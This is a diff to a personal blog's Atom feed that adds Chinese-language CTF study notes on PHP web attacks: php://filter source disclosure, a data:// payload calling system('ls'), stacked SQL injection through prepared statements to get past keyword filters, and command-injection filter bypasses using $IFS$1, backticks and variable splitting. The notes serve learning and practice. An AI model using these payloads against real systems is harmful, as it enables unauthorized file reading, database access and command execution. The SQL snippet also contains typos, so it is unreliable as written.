@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://hagemon.github.io</id>
     <title>Hagemon&apos;s Log</title>
-    <updated>2021-06-28T11:48:48.716Z</updated>
+    <updated>2021-07-01T14:02:40.434Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://hagemon.github.io"/>
     <link rel="self" href="https://hagemon.github.io/atom.xml"/>
@@ -293,6 +293,12 @@ $b == 0; # 比较时会去掉字母
 echo dechex(ord('a'));  // 输出61
 &gt;
 </code></pre>
+<p>有时也需要对base64进行解码：</p>
+<pre><code>&lt;?php
+$str = 'VGhpcyBpcyBhbiBlbmNvZGVkIHN0cmluZw==';
+echo base64_decode($str);
+?&gt;
+</code></pre>
 <p>#序列化和反序列化</p>
 <p>在php中，反序列化之前会执行__wakeup函数。</p>
 <p>在我们对一个class的对象进行序列化后，可以得到一个形容它的字符串，比如：</p>
@@ -341,6 +347,13 @@ Content-Type: application/x-www-form-urlencoded
 </code></pre>
 <h2 id="data协议">data协议</h2>
 <p>在URL中添加<code>data://text/plain,&lt;?php%20system(&quot;ls&quot;);?&gt;</code></p>
+<h2 id="filter-协议">filter 协议</h2>
+<p>格式为</p>
+<pre><code>index.php?file=php://filter/read=convert.base64-encode/resource=index.php
+</code></pre>
+<p>输出的结果是base64编码的，可以使用浏览器控制台进行解码：</p>
+<pre><code>window.atob('PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7NzJiZDBjOTYtYWU1MC00YzI4LTg4MjEtZGI4NGI4OWM3YjU1fQo=')
+</code></pre>
 <h1 id="文件包含">文件包含</h1>
 <p>文件包含会执行include的php文件，如果php文件里面同时输出你的输入，以及对某个文件进行包含，那么可以利用这点执行php代码，比如：</p>
 <pre><code class="language-php">&lt;?php
@@ -408,6 +421,22 @@ include($page);
 <p>空格可以使用别的字符替代，比较常见的是<code>%a0</code>，注意若在url里写，则可能要将别的特殊字符也用url编码，浏览器才会合适解析，比如要把<code>'</code>改写为<code>%27</code>。</p>
 <h2 id="过滤union-select">过滤union select</h2>
 <p>可以尝试用大写部分字符来完成</p>
+<h1 id="堆叠注入">堆叠注入</h1>
+<h2 id="预编译">预编译</h2>
+<p>当堆叠注入条件下，过滤了select、update等语句的时候，可以使用预编译的方式：</p>
+<pre><code>-1';
+set @sql=concat('se', 'lect * from table;', );
+prepare stmt from @sql;
+EXCUTE stmt;
+</code></pre>
+<h1 id="rce">RCE</h1>
+<h2 id="应对过滤">应对过滤</h2>
+<p>在执行linux指令的时候，可能空格、标点等会被过滤：</p>
+<ul>
+<li><code>$IFS$1</code>可以代表文本分隔符，来替代空格</li>
+<li>在<code>ls</code>周边加入反引号`可以输出执行结果</li>
+<li>如果过滤了关键词，可以先声明变量，然后用变量替代<code>a=g;cat$IFS$1fla$a.php;</code></li>
+</ul>
 ]]></content>
     </entry>
     <entry>
